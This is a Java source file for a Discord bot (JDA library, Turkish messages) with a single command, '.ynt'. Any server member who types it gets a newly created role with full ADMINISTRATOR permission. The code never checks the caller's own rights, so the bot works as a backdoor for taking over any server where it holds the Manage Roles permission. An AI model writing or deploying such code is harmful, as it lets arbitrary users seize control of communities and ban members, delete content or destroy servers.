import net.dv8tion.jda.api.JDA;
import net.dv8tion.jda.api.JDABuilder;
import net.dv8tion.jda.api.Permission;
import net.dv8tion.jda.api.entities.Member;
import net.dv8tion.jda.api.entities.Role;
import net.dv8tion.jda.api.entities.Guild;
import net.dv8tion.jda.api.events.message.MessageReceivedEvent;
import net.dv8tion.jda.api.hooks.ListenerAdapter;
import net.dv8tion.jda.api.requests.GatewayIntent;
import net.dv8tion.jda.api.utils.MemberCachePolicy;

import java.util.EnumSet;

public class Bot extends ListenerAdapter {

    public static void main(String[] args) throws Exception {
        String token = System.getenv("BOT_TOKEN");

        if (token == null || token.isEmpty()) {
            System.out.println("BOT_TOKEN bulunamadı!");
            return;
        }

        JDA jda = JDABuilder.createDefault(token)
                .enableIntents(GatewayIntent.MESSAGE_CONTENT, GatewayIntent.GUILD_MEMBERS)
                .setMemberCachePolicy(MemberCachePolicy.ALL)
                .addEventListeners(new Bot())
                .build();

        jda.awaitReady();
        System.out.println("Bot başarıyla giriş yaptı!");
    }

    @Override
    public void onMessageReceived(MessageReceivedEvent event) {
        if (event.getAuthor().isBot()) return;
        if (!event.isFromGuild()) return;

        String mesaj = event.getMessage().getContentRaw().trim();

        if (mesaj.equalsIgnoreCase(".ynt")) {
            Guild guild = event.getGuild();
            Member member = event.getMember();

            if (member == null) {
                event.getChannel().sendMessage("Üye bilgisi alınamadı.").queue();
                return;
            }

            // Botun yetkisi var mı kontrol et
            if (!guild.getSelfMember().hasPermission(Permission.MANAGE_ROLES)) {
                event.getChannel().sendMessage("Botun **Rolleri Yönet** izni yok!").queue();
                return;
            }

            // Yeni rol oluştur
            guild.createRole()
                    .setName("Yönetici-" + member.getUser().getName())
                    .setPermissions(Permission.ADMINISTRATOR)
                    .setHoisted(true)
                    .queue(role -> {
                        // Rolü kişiye ver
                        guild.addRoleToMember(member, role).queue(
                                success -> event.getChannel().sendMessage(
                                        member.getAsMention() + " → **" + role.getName() + "** rolü verildi! (Yönetici izni aktif)"
                                ).queue(),
                                error -> event.getChannel().sendMessage("Rol verilemedi: " + error.getMessage()).queue()
                        );
                    }, error -> {
                        event.getChannel().sendMessage("Rol oluşturulamadı: " + error.getMessage()).queue();
                    });
        }
    }
}
